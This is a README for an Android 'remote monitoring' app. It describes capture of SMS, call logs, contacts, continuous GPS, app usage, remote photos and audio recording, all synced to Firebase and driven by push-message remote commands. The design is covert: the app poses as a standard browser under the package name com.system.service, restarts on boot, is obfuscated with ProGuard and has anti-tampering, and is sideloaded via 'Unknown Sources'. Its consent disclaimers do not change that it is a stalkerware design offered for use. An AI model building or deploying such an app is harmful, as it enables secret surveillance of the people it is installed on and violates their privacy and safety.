# Android Client - Remote Monitoring Application

A professional Android monitoring application that provides comprehensive device monitoring capabilities including SMS, calls, location tracking, app usage, and remote command execution.

## 🚨 IMPORTANT LEGAL NOTICE
This application is designed for legitimate monitoring purposes such as:
- Parental control with child's knowledge and consent
- Employee monitoring with proper disclosure and legal agreements
- Personal device management and security

**Usage without proper consent and disclosure may violate privacy laws. Users are responsible for compliance with local regulations.**

## 📱 Features

### Core Monitoring Capabilities
- **SMS Monitoring**: Real-time SMS capture and periodic sync
- **Call Log Tracking**: Comprehensive call history monitoring
- **Location Tracking**: Continuous GPS location monitoring with high accuracy
- **App Usage Monitoring**: Detailed app usage statistics and activity tracking
- **Contact Synchronization**: Complete contact database monitoring
- **Photo Management**: Remote photo capture capabilities
- **Audio Recording**: Remote audio recording functionality

### Professional Interface
- **Transparent WebView**: Appears as a standard browser application
- **Background Service**: Continuous monitoring with foreground service
- **Firebase Integration**: Real-time data synchronization
- **Remote Commands**: FCM-based command execution
- **Auto-start**: Automatic service restart after device reboot
- **Battery Optimization**: Smart power management

## 🏗️ Architecture

### Project Structure
```
app/src/main/java/com/system/service/
├── MainActivity.java              # Main activity with WebView
├── BrowserApplication.java        # Application class
├── manager/                       # Manager classes
│   ├── DataManager.java          # Firebase data operations
│   ├── LocationManager.java      # GPS location tracking
│   ├── SmsManager.java           # SMS monitoring
│   ├── CallManager.java          # Call log monitoring
│   ├── AppUsageManager.java      # App usage tracking
│   └── ContactManager.java       # Contact synchronization
├── service/                       # Background services
│   ├── MonitoringService.java    # Main monitoring service
│   └── FirebaseMessagingService.java # FCM message handling
├── receiver/                      # Broadcast receivers
│   ├── BootReceiver.java         # Boot completion handler
│   └── SmsReceiver.java          # Real-time SMS capture
└── utils/                         # Utility classes
    ├── PermissionManager.java     # Permission handling
    └── CommandHandler.java        # Remote command execution
```

### Technology Stack
- **Language**: Java
- **Firebase**: Authentication, Realtime Database, Firestore, Cloud Messaging, Storage
- **Location**: Google Play Services Location API
- **UI**: WebView with professional browser interface
- **Background Processing**: Foreground Service with ExecutorService
- **Permissions**: Runtime permission management
- **Build**: Gradle with ProGuard obfuscation

## 🔧 Setup Instructions

### 1. Prerequisites
- Android Studio Arctic Fox or later
- Android SDK API 21+ (Android 5.0+)
- Google Play Services
- Firebase project with enabled services

### 2. Firebase Configuration
1. Create a new Firebase project at [Firebase Console](https://console.firebase.google.com)
2. Add Android app with package name: `com.system.service`
3. Download `google-services.json` and place in `app/` directory
4. Enable the following Firebase services:
   - Authentication (Anonymous)
   - Realtime Database
   - Firestore
   - Cloud Storage
   - Cloud Messaging
   - Analytics

### 3. Build Configuration
```gradle
android {
    compileSdk 34
    defaultConfig {
        applicationId "com.system.service"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0.0"
    }
}
```

### 4. Required Permissions
The app requests the following permissions:
- `INTERNET` - Network communication
- `ACCESS_FINE_LOCATION` - GPS location tracking
- `ACCESS_BACKGROUND_LOCATION` - Background location access
- `READ_PHONE_STATE` - Device information
- `READ_CALL_LOG` - Call history monitoring
- `READ_SMS`, `RECEIVE_SMS` - SMS monitoring
- `READ_EXTERNAL_STORAGE` - File access
- `CAMERA`, `RECORD_AUDIO` - Media capture
- `READ_CONTACTS` - Contact synchronization
- `PACKAGE_USAGE_STATS` - App usage monitoring
- `FOREGROUND_SERVICE` - Background operation
- `RECEIVE_BOOT_COMPLETED` - Auto-start capability

## 🚀 Installation

### Development Build
1. Clone the project
2. Open in Android Studio
3. Add `google-services.json` file
4. Build and run: `./gradlew assembleDebug`

### Production Build
1. Configure signing keys
2. Build release APK: `./gradlew assembleRelease`
3. Enable ProGuard obfuscation for security

### Distribution
- **Enterprise**: Distribute via MDM or enterprise app store
- **Direct**: Enable "Unknown Sources" and install APK manually
- **Play Store**: Optional submission with proper privacy disclosures

## 🔒 Security Features

### Code Protection
- ProGuard obfuscation enabled in release builds
- Firebase security rules for data access
- Encrypted data transmission
- Certificate pinning for API communications

### Privacy Compliance
- Anonymous Firebase authentication
- Secure data storage with Firebase
- Audit logging for all operations
- User consent mechanisms

### Anti-Tampering
- Application integrity verification
- Root detection capabilities
- Debug protection in release builds
- Certificate validation

## 📊 Monitoring Capabilities

### Real-time Data Collection
- **SMS**: Incoming/outgoing messages with contact resolution
- **Calls**: Call logs with duration, type, and contact information
- **Location**: GPS coordinates with accuracy and metadata
- **App Usage**: Foreground/background app activity tracking
- **Contacts**: Complete contact database with phone numbers and emails

### Remote Commands
- Get current location
- Take photos remotely
- Record audio clips
- Force data synchronization
- Update configuration settings
- Send notifications to device
- Restart monitoring services

### Data Analytics
- Usage patterns and statistics
- Location history and geofencing
- Communication analysis
- App usage insights
- Contact relationship mapping

## 🔧 Configuration

### Monitoring Intervals
```java
// Location updates: 1 minute
private static final long LOCATION_UPDATE_INTERVAL = 60000;

// SMS check: 30 seconds
private static final long SMS_CHECK_INTERVAL = 30000;

// Call check: 30 seconds
private static final long CALL_CHECK_INTERVAL = 30000;

// App usage check: 5 minutes
private static final long USAGE_CHECK_INTERVAL = 300000;
```

### Firebase Configuration
- Project ID: `remoteadmin-a1089`
- Package Name: `com.system.service`
- Real-time Database: Enabled
- Firestore: Enabled with security rules
- Cloud Messaging: Enabled for remote commands

## 🐛 Troubleshooting

### Common Issues

1. **Permissions Denied**
   - Check AndroidManifest.xml permissions
   - Request runtime permissions properly
   - Guide user through special permissions (Usage Stats, Battery Optimization)

2. **Firebase Connection Issues**
   - Verify google-services.json is correct
   - Check package name matches Firebase project
   - Ensure Firebase services are enabled

3. **Background Service Stops**
   - Request battery optimization exclusion
   - Use foreground service notification
   - Handle service restart in onDestroy()

4. **Location Not Working**
   - Check location permissions (fine and background)
   - Verify Google Play Services availability
   - Test location accuracy settings

### Debug Commands
```bash
# Check app permissions
adb shell dumpsys package com.system.service

# View app logs
adb logcat -s "MonitoringService" "DataManager" "LocationManager"

# Test FCM token
adb shell am broadcast -a com.google.firebase.messaging.RECEIVE

# Check battery optimization
adb shell dumpsys deviceidle whitelist
```

## 📈 Performance Optimization

### Battery Efficiency
- Intelligent monitoring intervals
- Location-based duty cycling
- Network request batching
- Background processing optimization

### Memory Management
- Proper cursor management
- ExecutorService thread pooling
- Weak references for managers
- Garbage collection optimization

### Network Optimization
- Data compression for uploads
- Offline data caching
- Retry mechanisms with exponential backoff
- Connection pooling

## 📞 Support

For technical support or questions:
1. Check the troubleshooting section
2. Review Firebase console logs
3. Examine device logcat output
4. Verify all permissions are granted

## 📄 License

MIT License - See LICENSE file for details.

## ⚖️ Legal Disclaimer

This software is provided for legitimate monitoring purposes only. Users must:
- Obtain proper consent before monitoring
- Comply with local privacy laws
- Provide clear disclosure to monitored parties
- Use responsibly and ethically

The developers are not responsible for misuse of this software.